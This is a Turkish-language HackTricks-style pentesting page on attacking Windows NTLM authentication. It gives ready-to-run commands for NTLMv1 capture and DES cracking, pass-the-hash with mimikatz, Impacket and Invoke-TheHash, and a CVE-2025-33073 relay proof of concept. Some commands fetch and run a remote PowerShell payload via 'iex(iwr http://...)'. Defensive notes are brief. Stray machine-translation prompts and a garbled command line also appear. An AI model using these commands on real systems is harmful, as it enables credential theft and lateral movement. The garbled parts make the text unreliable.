# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Temel Bilgiler

**Windows XP ve Server 2003** işletim sistemlerinin kullanıldığı ortamlarda, kolayca ele geçirilebildikleri yaygın olarak bilinmesine rağmen LM (Lan Manager) hash'leri kullanılır. Belirli bir LM hash'i olan `AAD3B435B51404EEAAD3B435B51404EE`, LM'nin kullanılmadığı bir durumu belirtir ve boş bir string'in hash'ini temsil eder.

Varsayılan olarak **Kerberos** authentication protocol'ü birincil yöntem olarak kullanılır. NTLM (NT LAN Manager) şu belirli durumlarda devreye girer: Active Directory'nin bulunmaması, domain'in mevcut olmaması, hatalı yapılandırma nedeniyle Kerberos'un düzgün çalışmaması veya geçerli bir hostname yerine IP adresi kullanılarak bağlantı kurulmaya çalışılması.

Network packet'larındaki **"NTLMSSP"** header'ının varlığı, bir NTLM authentication işlemini gösterir.

Authentication protocol'leri olan LM, NTLMv1 ve NTLMv2 desteği, `%windir%\Windows\System32\msv1\_0.dll` konumunda bulunan belirli bir DLL tarafından sağlanır.

**Önemli Noktalar**:

- LM hash'leri savunmasızdır ve boş bir LM hash'i (`AAD3B435B51404EEAAD3B435B51404EE`) LM'nin kullanılmadığını belirtir.
- Kerberos varsayılan authentication yöntemidir; NTLM yalnızca belirli koşullarda kullanılır.
- NTLM authentication packet'ları, "NTLMSSP" header'ı ile tanımlanabilir.
- LM, NTLMv1 ve NTLMv2 protocol'leri `msv1\_0.dll` system file'ı tarafından desteklenir.

## LM, NTLMv1 ve NTLMv2

Hangi protocol'ün kullanılacağını kontrol edebilir ve yapılandırabilirsiniz:

### GUI

_secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level yolunu izleyin. 0 ile 5 arasında 6 seviye vardır.

![LM, NTLMv1 ve NTLMv2 - GUI: secpol.msc'yi çalıştırın - Local policies - Security Options - Network Security: LAN Manager authentication level. 0 ile 5 arasında 6 seviye vardır](<../../images/image (919).png>)

### Registry

Bu işlem seviyeyi 5 olarak ayarlar:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Olası değerler:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Temel NTLM Domain authentication Scheme

1. **user**, **credentials** bilgilerini girer
2. İstemci makine, **domain name** ve **username** bilgilerini göndererek **authentication request** gönderir
3. **server**, **challenge** gönderir
4. **client**, anahtar olarak password hash'ini kullanarak **challenge** değerini **encrypt** eder ve response olarak gönderir
5. **server**, **domain name, username, challenge ve response** bilgilerini **Domain controller**'a gönderir. Yapılandırılmış bir **Active Directory** yoksa veya domain name server'ın adıysa, credentials bilgileri **yerel olarak kontrol edilir**.
6. **domain controller**, her şeyin doğru olup olmadığını kontrol eder ve bilgileri server'a gönderir

**server** ve **Domain Controller**, **Netlogon** server'ı aracılığıyla bir **Secure Channel** oluşturabilir; çünkü Domain Controller server'ın password'ünü bilir (bu bilgi **NTDS.DIT** db'sinin içindedir).

### Local NTLM authentication Scheme

Authentication, **daha önce** belirtilen yöntemdeki gibidir; ancak **server**, authenticate olmaya çalışan **user**'ın hash'ini **SAM** dosyasında bilir. Bu nedenle **Domain Controller**'a sormak yerine **server**, user'ın authenticate olup olamayacağını **kendisi kontrol eder**.

### NTLMv1 Challenge

**challenge length 8 bytes** ve **response** uzunluğu 24 bytes'tır.

**NT hash (16bytes)**, **7bytes'lık 3 parçaya** ayrılır (7B + 7B + (2B+0x00\*5)): **son parça zero'larla doldurulur**. Ardından **challenge**, her parça kullanılarak ayrı ayrı **cipher** edilir ve **cipher** edilmiş sonuç bytes'ları birleştirilir. Toplam: 8B + 8B + 8B = 24Bytes.

**Problems**:

- **randomness** eksikliği
- 3 parça, NT hash'i bulmak için **ayrı ayrı attack** edilebilir
- **DES crack edilebilir**
- 3º key her zaman **5 zero**'dan oluşur.
- Aynı **challenge** verildiğinde **response** da aynı olur. Bu nedenle victim'a **challenge** olarak "**1122334455667788**" string'ini verebilir ve kullanılan response'a karşı **precomputed rainbow tables** kullanarak attack gerçekleştirebilirsiniz.

### NTLMv1 attack

Günümüzde **Unconstrained Delegation** yapılandırılmış ortamlarla karşılaşmak daha az yaygın hale geliyor; ancak bu, yapılandırılmış bir **Print Spooler service**'ı **abuse** edemeyeceğiniz anlamına gelmez.

AD üzerinde zaten sahip olduğunuz bazı credentials/session'ları kullanarak printer'dan **sizin kontrolünüzdeki bir host'a authenticate olmasını** isteyebilirsiniz. Ardından `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak **authentication challenge'ı 1122334455667788 olarak ayarlayabilir**, authentication attempt'i capture edebilir ve işlem **NTLMv1** kullanılarak yapıldıysa bunu **crack edebilirsiniz**.\
`responder` kullanıyorsanız authentication'ı **downgrade** etmeyi denemek için **`--lm` flag'ini kullanmayı** deneyebilirsiniz.\
_Bu technique için authentication'ın NTLMv1 kullanılarak gerçekleştirilmesi gerektiğini unutmayın (NTLMv2 geçerli değildir)._

Printer'ın authentication sırasında computer account'ı kullanacağını ve computer account'larının **uzun ve random password'ler** kullandığını unutmayın; bu password'leri yaygın **dictionaries** kullanarak **crack edememeniz** muhtemeldir. Ancak **NTLMv1** authentication **DES** kullanır ([more info here](#ntlmv1-challenge)); bu nedenle özellikle DES crack etmeye adanmış bazı service'leri kullanarak bunu crack edebilirsiniz (örneğin [https://crack.sh/](https://crack.sh) veya [https://ntlmv1.com/](https://ntlmv1.com) kullanabilirsiniz).

### NTLMv1 attack with hashcat

NTLMv1, NTLMv1 mesajlarını hashcat ile kırılabilecek bir method ile formatlayan NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) kullanılarak da kırılabilir.<sup>[[1]](#references)</sup>

Komut
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
aşağıdakini çıktı olarak verir:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to include in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
hashcat çalıştırın (dağıtık çalıştırma için hashtopolis gibi bir tool kullanmak en iyisidir), aksi takdirde bu işlem birkaç gün sürecektir.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Bu durumda parolanın password olduğunu biliyoruz, bu yüzden demo amaçlarıyla hile yapacağız:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Şimdi, kırılmış des anahtarlarını NTLM hash'inin parçalarına dönüştürmek için hashcat-utilities kullanmamız gerekiyor:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Son olarak, son kısım:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Lütfen birleştirilecek metinleri paylaşın.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge length 8 bytes'tır** ve **2 response gönderilir**: Biri **24 bytes** uzunluğundadır ve **diğerinin** uzunluğu **değişkendir**.

**İlk response**, **client ve domain** tarafından oluşturulan **string'in**, **key** olarak **NT hash'in** **MD4 hash'i** kullanılarak **HMAC_MD5** ile şifrelenmesiyle oluşturulur. Ardından **result**, **challenge'ı** HMAC_MD5 kullanarak şifrelemek için **key** olarak kullanılır. Buna 8 bytes uzunluğunda bir **client challenge** eklenir. Toplam: 24 B.

**İkinci response**, çeşitli değerler kullanılarak oluşturulur (yeni bir client challenge, **replay attacks**'i önlemek için bir **timestamp**...)

Başarılı bir authentication sürecini yakalamış bir **pcap** dosyanız varsa domain, username, challenge ve response'u almak ve password'ü kırmayı denemek için şu guide'ı takip edebilirsiniz: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Victim'ın hash'ine sahip olduğunuzda**, onu **impersonate** etmek için kullanabilirsiniz.\
Bu **hash'i kullanarak** **NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir; **veya** yeni bir **sessionlogon** oluşturup bu **hash'i** **LSASS** içine **inject** edebilirsiniz. Böylece herhangi bir **NTLM authentication gerçekleştirildiğinde**, **bu hash kullanılacaktır.** Son seçenek, mimikatz'ın yaptığı şeydir.

**Lütfen Pass-the-Hash attacks'lerini Computer accounts kullanarak da gerçekleştirebileceğinizi unutmayın.**

### **Mimikatz**

**Administrator olarak çalıştırılmalıdır**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Bu, mimikatz'ı başlatan kullanıcılara ait olacak bir process başlatır; ancak LSASS içinde kaydedilen credentials, mimikatz parametrelerinde bulunanlardır. Ardından, düz metin parolayı bilmenize gerek kalmadan network resources'a o kullanıcıymışsınız gibi erişebilirsiniz (`runas /netonly` trick'ine benzer).

### Linux'tan Pass-the-Hash

Linux'tan Pass-the-Hash kullanarak Windows makinelerinde code execution elde edebilirsiniz.\
[**Nasıl yapılacağını öğrenmek için buraya erişin.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows derlenmiş araçları

[Impacket binaries for Windows'ı buradan indirebilirsiniz](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Bu durumda bir command belirtmeniz gerekir; cmd.exe ve powershell.exe interactive shell elde etmek için geçerli değildir)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Daha birçok Impacket binary'si vardır...

### Invoke-TheHash

PowerShell script'lerini buradan alabilirsiniz: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Bu fonksiyon **diğerlerinin tamamının bir karışımıdır**. **Birden fazla host** iletebilir, bazılarını **hariç tutabilir** ve kullanmak istediğiniz **seçeneği** (_SMBExec, WMIExec, SMBClient, SMBEnum_) **seçebilirsiniz**. **SMBExec** veya **WMIExec** seçeneklerinden **herhangi birini** seçer ancak herhangi bir _**Command**_ parametresi vermezseniz yalnızca **yeterli izinlere sahip olup olmadığınızı** **kontrol eder**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Yönetici olarak çalıştırılmalıdır**

Bu araç mimikatz ile aynı işlemi yapar (LSASS belleğini değiştirir).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Kullanıcı adı ve parola ile manuel Windows remote execution


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host üzerinden credentials çıkarma

**Daha fazla bilgi için** [**Windows host üzerinden credentials nasıl elde edilir, bu sayfayı okuyabilirsiniz**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack, bir attacker'ın **LSASS process'iyle doğrudan etkileşime girmeden** victim makinesinden NTLM hash'lerini almasını sağlayan gizli bir credentials çıkarma tekniğidir. Hash'leri doğrudan memory'den okuyan ve endpoint security çözümleri veya Credential Guard tarafından sıkça engellenen Mimikatz'ın aksine bu attack, **Security Support Provider Interface (SSPI) üzerinden NTLM authentication package'a (MSV1_0) yapılan local çağrılardan** yararlanır. Attacker öncelikle NetNTLMv1'e izin verildiğinden emin olmak için **NTLM ayarlarını düşürür** (ör. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic). Ardından çalışan process'lerden elde edilen mevcut user token'larını taklit eder ve bilinen bir challenge kullanarak NetNTLMv1 response'ları oluşturmak için local olarak NTLM authentication'ı tetikler.<sup>[[4]](#references)</sup>

Bu NetNTLMv1 response'ları yakalandıktan sonra attacker, **önceden hesaplanmış rainbow table'ları** kullanarak orijinal NTLM hash'lerini hızlıca kurtarabilir ve lateral movement için ek Pass-the-Hash attack'leri gerçekleştirebilir. Önemli olarak Internal Monologue Attack network traffic oluşturmadığı, code inject etmediği veya doğrudan memory dump'larını tetiklemediği için gizliliğini korur; bu da Mimikatz gibi geleneksel yöntemlere kıyasla defender'ların bunu tespit etmesini zorlaştırır.

NetNTLMv1 kabul edilmiyorsa (zorunlu security policy'leri nedeniyle), attacker bir NetNTLMv1 response'u almayı başaramayabilir.

Bu durumu ele almak için Internal Monologue tool'u güncellendi: NetNTLMv1 başarısız olursa bile **NetNTLMv2 response'larını yakalamak** için `AcceptSecurityContext()` kullanarak dinamik şekilde bir server token edinir. NetNTLMv2'yi crack etmek çok daha zor olsa da relay attack'leri veya sınırlı durumlarda offline brute-force için hâlâ bir yol açar.

PoC şu adreste bulunabilir: **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay and Responder

**Bu attack'lerin nasıl gerçekleştirileceğine dair daha ayrıntılı guide'ı burada okuyun:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Bir network capture'dan NTLM challenge'larını parse etme

**Şunu kullanabilirsiniz:** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows, bir host'tan kaynaklanan NTLM (veya Kerberos) authentication'ın SYSTEM privileges elde etmek amacıyla **aynı** host'a geri relay edildiği *reflection* attack'lerini önlemeye çalışan çeşitli mitigation'lar içerir.

Microsoft, MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) ve sonraki patch'lerle çoğu public chain'i devre dışı bıraktı; ancak **CVE-2025-33073**, *marshalled* (serialized) target-info içeren **Service Principal Name'leri (SPN'ler) SMB client'ın truncate etmesinden** yararlanılarak bu protection'ların hâlâ bypass edilebildiğini gösterir.<sup>[[5]](#references)[[6]](#references)</sup>

### Bug'ın TL;DR özeti
1. Bir attacker, label'ı marshalled bir SPN'i encode eden bir **DNS A-record** kaydeder – ör.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Victim, bu hostname'e authentication yapmaya zorlanır (PetitPotam, DFSCoerce vb.).
3. SMB client target string'i `cifs/srv11UWhRCAAAAA…` olarak `lsasrv!LsapCheckMarshalledTargetInfo`'ya ilettiğinde, `CredUnmarshalTargetInfo` çağrısı **serialized blob'u kaldırır** ve geriye **`cifs/srv1`** kalır.
4. `msv1_0!SspIsTargetLocalhost` (veya Kerberos eşdeğeri), kısa host kısmı computer name (`SRV1`) ile eşleştiği için target'ın *localhost* olduğunu düşünür.
5. Sonuç olarak server, `NTLMSSP_NEGOTIATE_LOCAL_CALL` değerini set eder ve **LSASS’in SYSTEM access-token'ını** context'e inject eder (Kerberos için SYSTEM işaretli bir subsession key oluşturulur).
6. Bu authentication'ı `ntlmrelayx.py` **veya** `krbrelayx.py` ile relay etmek, aynı host üzerinde tam SYSTEM rights sağlar.<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Yamalar ve Azaltımlar
* **CVE-2025-33073** için yayımlanan KB yaması, `mrxsmb.sys::SmbCeCreateSrvCall` içine, hedefi marshalled info içeren tüm SMB bağlantılarını engelleyen bir kontrol ekler (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Yaması uygulanmamış host'larda bile reflection'ı önlemek için **SMB signing**'i zorunlu kılın.
* `*<base64>...*` biçimine benzeyen DNS kayıtlarını izleyin ve coercion vector'larını (PetitPotam, DFSCoerce, AuthIP...) engelleyin.

### Tespit fikirleri
* İstemci IP'sinin sunucu IP'sinden farklı olduğu `NTLMSSP_NEGOTIATE_LOCAL_CALL` içeren network capture'ları.
* Bir subsession key ve hostname'e eşit bir client principal içeren Kerberos AP-REQ.
* Aynı host'tan gerçekleştirilen remote SMB write işlemlerinin hemen ardından gelen Windows Event 4624/4648 SYSTEM logon'ları.<sup>[[5]](#references)</sup>

`NT AUTHORITY\SYSTEM` elde etmek için **SMB arbitrary ports** ve **TCP connection reuse** kullanan **March 2026** local reflection variant'ı için bkz.:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Referanslar
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Bir NTLMv2 Hash'ini Cracking Etme](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS'e Dokunmadan NTLM Hash'lerini Alma](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection Öldü, Yaşasın NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
